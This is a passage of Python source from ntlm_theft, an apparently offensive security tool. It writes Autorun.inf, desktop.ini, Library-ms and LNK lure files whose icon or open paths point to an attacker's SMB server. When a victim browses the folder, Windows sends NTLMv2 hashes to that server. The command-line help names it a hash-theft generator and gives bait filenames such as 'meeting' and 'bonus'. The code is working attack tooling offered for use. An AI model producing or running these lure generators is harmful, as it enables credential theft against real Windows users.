    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (INSTALL THEME)")


def create_autoruninf(server: str, filename: str, modern: bool = False) -> None:
    """Create Autorun.inf file. Not working on modern Windows."""
    if modern:
        print("Skipping Autorun.inf as it does not work on modern Windows")
        return

    content = f"""[autorun]
open=\\\\{server}\\setup.exe
icon=something.ico
action=open Setup.exe"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_desktopini(server: str, filename: str, modern: bool = False) -> None:
    """Create desktop.ini file. Not working on modern Windows."""
    if modern:
        print("Skipping desktop.ini as it does not work on modern Windows")
        return

    content = f"""[.ShellClassInfo]
IconResource=\\\\{server}\\aa"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_libraryms(server: str, filename: str, modern: bool = False) -> None:
    """Create Windows Library file with remote icon."""
    content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@shell32.dll,-34575</name>
<ownerSID>S-1-5-21-372074477-2495183225-776587326-1000</ownerSID>
<version>1</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>\\\\{server}\\aa</iconReference>
<templateInfo>
<folderType>{{7d49d726-3c21-4f05-99aa-fdc2c9474656}}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription publisher="Microsoft" product="Windows">
<description>@shell32.dll,-34577</description>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<simpleLocation>
<url>knownfolder:{{FDD39AD0-238F-46AF-ADB4-6C85480369C7}}</url>
<serialized>MBAAAEAFCAAA...MFNVAAAAAA</serialized>
</simpleLocation>
</searchConnectorDescription>
<searchConnectorDescription publisher="Microsoft" product="Windows">
<description>@shell32.dll,-34579</description>
<isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>
<simpleLocation>
<url>knownfolder:{{ED4824AF-DCE4-45A8-81E2-FC7965083634}}</url>
<serialized>MBAAAEAFCAAA...HJIfK9AAAAAA</serialized>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_lnk(server: str, filename: str, modern: bool = False) -> None:
    """Create LNK file with remote icon."""
    # These two numbers define location in template that holds icon location
    offset = 0x136
    max_path = 0xDF
    unc_path = f"\\\\{server}\\tools\\nc.ico"

    if len(unc_path) >= max_path:
        print("Server name too long for lnk template, skipping.")
        return

    unc_path_bytes = unc_path.encode("utf-16le")
    template_path = os.path.join(SCRIPT_DIRECTORY, "templates", "shortcut-template.lnk")

    with open(template_path, "rb") as lnk:
        shortcut = list(lnk.read())

    for i in range(len(unc_path_bytes)):
        shortcut[offset + i] = unc_path_bytes[i]

    with open(filename, "wb") as f:
        f.write(bytes(shortcut))

    print(f"Created: {filename} (BROWSE TO FOLDER)")


def list_generators() -> None:
    """Display all available generation types."""
    print("\nAvailable generation types:\n")
    print(f"{'Type':<15} {'Modern':<8} {'Action':<45} Description")
    print("-" * 100)

    # Special types first
    print(f"{'all':<15} {'N/A':<8} {'Generate all file types':<45} All attacks")
    print(
        f"{'modern':<15} {'N/A':<8} {'Generate modern Windows compatible only':<45} Skip deprecated attacks"
    )
    print("-" * 100)

    # Individual types
    for gen_type, info in sorted(GENERATORS.items()):
        modern_str = "Yes" if info["modern"] else "No"
        print(
            f"{gen_type:<15} {modern_str:<8} {info['action']:<45} {info['description']}"
        )

    print("\nUsage examples:")
    print("  ntlm_theft -g all -s 192.168.1.100 -f meeting")
    print("  ntlm_theft -g modern -s 192.168.1.100 -f bonus")
    print("  ntlm_theft -g docx -s 192.168.1.100 -f report")
    print()


def get_generator_function(func_name: str):
    """Get generator function by name."""
    return globals().get(func_name)


def generate_files(
    gen_type: str, server: str, base_filename: str, output_dir: str
) -> None:
    """Generate files based on type."""
    modern = gen_type == "modern"

    if gen_type in ("all", "modern"):
        for _gtype, info in GENERATORS.items():
            if modern and not info["modern"]:
                continue
            for suffix, func_name in info["files"]:
                func = get_generator_function(func_name)
                if func:
                    if suffix.startswith("/"):
                        # Absolute filename (like /Autorun.inf)
                        filepath = os.path.join(output_dir, suffix[1:])
                    else:
                        filepath = os.path.join(output_dir, base_filename + suffix)
                    func(server, filepath, modern)
    else:
        # Generate specific type
        if gen_type not in GENERATORS:
            sys.exit(f"Error: Unknown generation type '{gen_type}'")

        info = GENERATORS[gen_type]
        for suffix, func_name in info["files"]:
            func = get_generator_function(func_name)
            if func:
                if suffix.startswith("/"):
                    filepath = os.path.join(output_dir, suffix[1:])
                else:
                    filepath = os.path.join(output_dir, base_filename + suffix)
                func(server, filepath, modern=False)


def main() -> None:
    """Main entry point."""
    # Build choices from registry
    choices = {"all", "modern"} | set(GENERATORS.keys())

    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="ntlm_theft - Generate NTLMv2 hash theft files\nby Jacob Wilkin (Greenwolf)",
        usage="%(prog)s --generate <type> --server <ip> --filename <name>",
    )
    parser.add_argument(
        "-v",
        "--version",
        action="version",
        version=f"%(prog)s {__version__} : ntlm_theft by Jacob Wilkin (Greenwolf)",
    )
    parser.add_argument(
        "-l",
        "--list",
        action="store_true",
        dest="list_types",
        help="List all available generation types",
    )
    parser.add_argument(
        "-g",
        "--generate",
        action="store",
        dest="generate",
        choices=sorted(choices),
        help="Choose to generate all files or a specific filetype",
    )
    parser.add_argument(
        "-s",
        "--server",
        action="store",
        dest="server",
        help="The IP address of your SMB hash capture server",
    )
    parser.add_argument(
        "-f",
        "--filename",
        action="store",
        dest="filename",
        help="The base filename without extension",
    )

    args = parser.parse_args()

    # Handle --list
    if args.list_types:
        list_generators()
        sys.exit(0)

    # Require other arguments if not listing
    if not args.generate:
        parser.error("the following arguments are required: -g/--generate")
    if not args.server:
        parser.error("the following arguments are required: -s/--server")
    if not args.filename:
        parser.error("the following arguments are required: -f/--filename")

    # Validate inputs
    validate_filename(args.filename)
    server = validate_server(args.server)

    # Create output directory
    output_dir = args.filename
    if os.path.exists(output_dir):
        response = input(
            f"Directory '{output_dir}' already exists. Delete and recreate? [y/N]: "
        )
        if response.lower() not in ("y", "yes"):
            sys.exit("Aborted.")
        shutil.rmtree(output_dir)

    os.makedirs(output_dir)

    # Generate files
    generate_files(args.generate, server, args.filename, output_dir)

    print("Generation Complete.")


if __name__ == "__main__":
    main()
